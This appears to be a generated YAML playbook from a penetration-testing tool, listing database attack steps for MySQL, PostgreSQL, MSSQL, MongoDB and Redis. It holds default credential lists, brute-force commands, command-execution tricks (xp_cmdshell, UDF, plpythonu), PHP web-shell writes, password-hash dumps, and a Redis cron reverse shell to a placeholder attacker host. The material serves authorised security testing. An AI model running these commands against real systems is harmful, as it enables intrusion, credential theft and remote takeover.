@@ -1,0 +1,545 @@
+# GENERATED from database_methodology.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: database_methodology
+title: Database Penetration Testing Methodology
+source: database_methodology.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: mysql-mariadb-port-3306
+  name: MySQL/MariaDB (Port 3306)
+  steps:
+  - id: mysql-mariadb-port-3306.initial-reconnaissance
+    title: Initial Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 10
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p3306 --script=mysql-* {target}
+    - lang: bash
+      command: echo "quit" | nc {target} 3306
+  - id: mysql-mariadb-port-3306.authentication-testing
+    title: Authentication Testing
+    access_required: none
+    mutates: false
+    source_line: 19
+  - id: mysql-mariadb-port-3306.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 21
+    checks:
+    - 'root: (empty)'
+    - root:root
+    - root:mysql
+    - mysql:mysql
+    - admin:admin
+  - id: mysql-mariadb-port-3306.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 28
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt mysql://{target}
+    - lang: bash
+      command: medusa -h {target} -U users.txt -P passwords.txt -M mysql
+    - lang: bash
+      command: ncrack -p3306 --user root -P passwords.txt {target}
+  - id: mysql-mariadb-port-3306.direct-connection
+    title: Direct Connection
+    access_required: credential
+    mutates: false
+    source_line: 40
+    commands:
+    - lang: bash
+      command: mysql -h {target} -u root
+    - lang: bash
+      command: mysql -h {target} -u root -p
+  - id: mysql-mariadb-port-3306.exploitation
+    title: Exploitation
+    access_required: none
+    mutates: false
+    source_line: 46
+  - id: mysql-mariadb-port-3306.cve-2012-2122-authentication-bypass
+    title: CVE-2012-2122 - Authentication Bypass
+    access_required: credential
+    mutates: false
+    source_line: 48
+    commands:
+    - lang: bash
+      command: for i in $(seq 1 1000); do mysql -u root --password=bad -h {target} 2>/dev/null; done
+  - id: mysql-mariadb-port-3306.udf-privilege-escalation
+    title: UDF Privilege Escalation
+    access_required: shell
+    mutates: false
+    source_line: 54
+    commands:
+    - lang: sql
+      command: -- Check for lib_mysqludf_sys
+    - lang: sql
+      command: SELECT * FROM mysql.func;
+    - lang: sql
+      command: -- Execute commands
+    - lang: sql
+      command: SELECT sys_exec('id');
+  - id: mysql-mariadb-port-3306.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 64
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/mysql/mysql_version
+    - lang: bash
+      command: use auxiliary/scanner/mysql/mysql_login
+    - lang: bash
+      command: use auxiliary/admin/mysql/mysql_enum
+    - lang: bash
+      command: use auxiliary/scanner/mysql/mysql_hashdump
+    - lang: bash
+      command: use exploit/multi/mysql/mysql_udf_payload
+  - id: mysql-mariadb-port-3306.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: true
+    source_line: 73
+    commands:
+    - lang: sql
+      command: -- Version
+    - lang: sql
+      command: SELECT @@version;
+    - lang: sql
+      command: -- Current user
+    - lang: sql
+      command: SELECT user();
+    - lang: sql
+      command: -- Databases
+    - lang: sql
+      command: SHOW DATABASES;
+    - lang: sql
+      command: -- Users and hashes
+    - lang: sql
+      command: SELECT user,host,authentication_string FROM mysql.user;
+    - lang: sql
+      command: -- File read (requires FILE privilege)
+    - lang: sql
+      command: SELECT LOAD_FILE('/etc/passwd');
+    - lang: sql
+      command: -- File write (requires FILE privilege)
+    - lang: sql
+      command: SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+- id: postgresql-port-5432
+  name: PostgreSQL (Port 5432)
+  steps:
+  - id: postgresql-port-5432.initial-reconnaissance
+    title: Initial Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 98
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p5432 --script=pgsql-* {target}
+  - id: postgresql-port-5432.authentication-testing
+    title: Authentication Testing
+    access_required: none
+    mutates: false
+    source_line: 104
+  - id: postgresql-port-5432.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 106
+    checks:
+    - postgres:postgres
+    - postgres:(empty)
+    - admin:admin
+  - id: postgresql-port-5432.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 111
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt postgres://{target}
+  - id: postgresql-port-5432.direct-connection
+    title: Direct Connection
+    access_required: credential
+    mutates: false
+    source_line: 116
+    commands:
+    - lang: bash
+      command: psql -h {target} -U postgres
+    - lang: bash
+      command: psql "host={target} user=postgres"
+  - id: postgresql-port-5432.exploitation
+    title: Exploitation
+    access_required: none
+    mutates: false
+    source_line: 122
+  - id: postgresql-port-5432.command-execution-via-copy
+    title: Command Execution via COPY
+    access_required: none
+    mutates: true
+    source_line: 124
+    commands:
+    - lang: sql
+      command: -- Read files
+    - lang: sql
+      command: CREATE TABLE temp(t TEXT);
+    - lang: sql
+      command: COPY temp FROM '/etc/passwd';
+    - lang: sql
+      command: SELECT * FROM temp;
+    - lang: sql
+      command: -- Write files (requires superuser)
+    - lang: sql
+      command: COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+  - id: postgresql-port-5432.command-execution-via-extensions
+    title: Command Execution via Extensions
+    access_required: none
+    mutates: false
+    source_line: 135
+    commands:
+    - lang: sql
+      command: -- Check available extensions
+    - lang: sql
+      command: SELECT * FROM pg_available_extensions;
+    - lang: sql
+      command: -- If plpythonu is available
+    - lang: sql
+      command: CREATE EXTENSION plpythonu;
+    - lang: sql
+      command: CREATE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
+    - lang: sql
+      command: import os
+    - lang: sql
+      command: return os.popen(cmd).read()
+    - lang: sql
+      command: $$ LANGUAGE plpythonu;
+    - lang: sql
+      command: SELECT exec_cmd('id');
+  - id: postgresql-port-5432.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 150
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/postgres/postgres_version
+    - lang: bash
+      command: use auxiliary/scanner/postgres/postgres_login
+    - lang: bash
+      command: use auxiliary/admin/postgres/postgres_sql
+    - lang: bash
+      command: use exploit/linux/postgres/postgres_payload
+  - id: postgresql-port-5432.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: true
+    source_line: 158
+    commands:
+    - lang: sql
+      command: -- Version
+    - lang: sql
+      command: SELECT version();
+    - lang: sql
+      command: -- Current user
+    - lang: sql
+      command: SELECT current_user;
+    - lang: sql
+      command: -- Databases
+    - lang: sql
+      command: SELECT datname FROM pg_database;
+    - lang: sql
+      command: -- Tables
+    - lang: sql
+      command: SELECT tablename FROM pg_tables WHERE schemaname='public';
+    - lang: sql
+      command: -- Users
+    - lang: sql
+      command: SELECT usename, passwd FROM pg_shadow;
+- id: microsoft-sql-server-port-1433
+  name: Microsoft SQL Server (Port 1433)
+  steps:
+  - id: microsoft-sql-server-port-1433.initial-reconnaissance
+    title: Initial Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 180
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p1433 --script=ms-sql-* {target}
+    - lang: bash
+      command: nmap -sU -p1434 --script=ms-sql-info {target}
+  - id: microsoft-sql-server-port-1433.authentication-testing
+    title: Authentication Testing
+    access_required: none
+    mutates: false
+    source_line: 189
+  - id: microsoft-sql-server-port-1433.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 191
+    checks:
+    - sa:(empty)
+    - sa:sa
+    - sa:password
+  - id: microsoft-sql-server-port-1433.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 196
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt mssql://{target}
+  - id: microsoft-sql-server-port-1433.direct-connection
+    title: Direct Connection
+    access_required: credential
+    mutates: false
+    source_line: 201
+    commands:
+    - lang: bash
+      command: sqsh -S {target} -U sa
+    - lang: bash
+      command: impacket-mssqlclient sa@{target}
+    - lang: bash
+      command: impacket-mssqlclient domain/user:password@{target} -windows-auth
+  - id: microsoft-sql-server-port-1433.exploitation
+    title: Exploitation
+    access_required: none
+    mutates: false
+    source_line: 211
+  - id: microsoft-sql-server-port-1433.xp-cmdshell
+    title: xp_cmdshell
+    access_required: none
+    mutates: false
+    source_line: 213
+    commands:
+    - lang: sql
+      command: -- Enable xp_cmdshell
+    - lang: sql
+      command: EXEC sp_configure 'show advanced options', 1;
+    - lang: sql
+      command: RECONFIGURE;
+    - lang: sql
+      command: EXEC sp_configure 'xp_cmdshell', 1;
+    - lang: sql
+      command: RECONFIGURE;
+    - lang: sql
+      command: -- Execute commands
+    - lang: sql
+      command: EXEC xp_cmdshell 'whoami';
+  - id: microsoft-sql-server-port-1433.linked-servers
+    title: Linked Servers
+    access_required: none
+    mutates: false
+    source_line: 225
+    commands:
+    - lang: sql
+      command: -- List linked servers
+    - lang: sql
+      command: EXEC sp_linkedservers;
+    - lang: sql
+      command: -- Execute on linked server
+    - lang: sql
+      command: EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;
+  - id: microsoft-sql-server-port-1433.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 234
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/mssql/mssql_ping
+    - lang: bash
+      command: use auxiliary/scanner/mssql/mssql_login
+    - lang: bash
+      command: use auxiliary/admin/mssql/mssql_enum
+    - lang: bash
+      command: use auxiliary/admin/mssql/mssql_exec
+    - lang: bash
+      command: use exploit/windows/mssql/mssql_payload
+  - id: microsoft-sql-server-port-1433.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: false
+    source_line: 243
+    commands:
+    - lang: sql
+      command: -- Version
+    - lang: sql
+      command: SELECT @@version;
+    - lang: sql
+      command: -- Current user
+    - lang: sql
+      command: SELECT SYSTEM_USER;
+    - lang: sql
+      command: -- Databases
+    - lang: sql
+      command: SELECT name FROM sys.databases;
+    - lang: sql
+      command: -- Tables
+    - lang: sql
+      command: SELECT * FROM information_schema.tables;
+    - lang: sql
+      command: -- Users
+    - lang: sql
+      command: SELECT name FROM sys.sql_logins;
+    - lang: sql
+      command: -- Password hashes
+    - lang: sql
+      command: SELECT name, password_hash FROM sys.sql_logins;
+- id: mongodb-port-27017
+  name: MongoDB (Port 27017)
+  steps:
+  - id: mongodb-port-27017.initial-reconnaissance
+    title: Initial Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 268
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p27017 --script=mongodb-* {target}
+  - id: mongodb-port-27017.direct-connection
+    title: Direct Connection
+    access_required: none
+    mutates: false
+    source_line: 274
+    commands:
+    - lang: bash
+      command: mongosh --host {target} --port 27017
+    - lang: bash
+      command: mongo {target}:27017
+  - id: mongodb-port-27017.common-vulnerabilities
+    title: Common Vulnerabilities
+    access_required: none
+    mutates: false
+    source_line: 283
+  - id: mongodb-port-27017.no-authentication-default
+    title: No Authentication (Default)
+    access_required: none
+    mutates: false
+    source_line: 285
+  - id: mongodb-port-27017.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 302
+    checks:
+    - admin:admin
+    - root:root
+  - id: mongodb-port-27017.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: false
+    source_line: 306
+  - id: mongodb-port-27017.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 321
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/mongodb/mongodb_login
+    - lang: bash
+      command: use auxiliary/gather/mongodb_js_inject_collection_enum
+- id: redis-port-6379
+  name: Redis (Port 6379)
+  steps:
+  - id: redis-port-6379.initial-reconnaissance
+    title: Initial Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 331
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p6379 --script=redis-* {target}
+  - id: redis-port-6379.direct-connection
+    title: Direct Connection
+    access_required: none
+    mutates: false
+    source_line: 337
+    commands:
+    - lang: bash
+      command: redis-cli -h {target}
+  - id: redis-port-6379.common-vulnerabilities
+    title: Common Vulnerabilities
+    access_required: none
+    mutates: false
+    source_line: 342
+  - id: redis-port-6379.no-authentication
+    title: No Authentication
+    access_required: none
+    mutates: false
+    source_line: 344
+    commands:
+    - lang: bash
+      command: redis-cli -h {target} INFO
+  - id: redis-port-6379.arbitrary-file-write
+    title: Arbitrary File Write
+    access_required: none
+    mutates: true
+    source_line: 350
+    commands:
+    - lang: bash
+      command: redis-cli -h {target}
+    - lang: bash
+      command: CONFIG SET dir /root/.ssh/
+    - lang: bash
+      command: CONFIG SET dbfilename authorized_keys
+    - lang: bash
+      command: SET key "\n\nssh-rsa AAAA... user@attacker\n\n"
+    - lang: bash
+      command: SAVE
+    - lang: bash
+      command: CONFIG SET dir /var/www/html/
+    - lang: bash
+      command: CONFIG SET dbfilename shell.php
+    - lang: bash
+      command: SET key "<?php system($_GET['cmd']); ?>"
+    - lang: bash
+      command: SAVE
+    - lang: bash
+      command: CONFIG SET dir /var/spool/cron/crontabs/
+    - lang: bash
+      command: CONFIG SET dbfilename root
+    - lang: bash
+      command: SET key "\n* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"
+    - lang: bash
+      command: SAVE
+  - id: redis-port-6379.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 372
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/redis/redis_server
+    - lang: bash
+      command: use auxiliary/scanner/redis/file_upload
+    - lang: bash
+      command: use exploit/linux/redis/redis_replication_cmd_exec
+  - id: redis-port-6379.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: false
+    source_line: 379
+    commands:
+    - lang: bash
+      command: INFO
+    - lang: bash
+      command: KEYS *
+    - lang: bash
+      command: CONFIG GET *
+    - lang: bash
+      command: CLIENT LIST
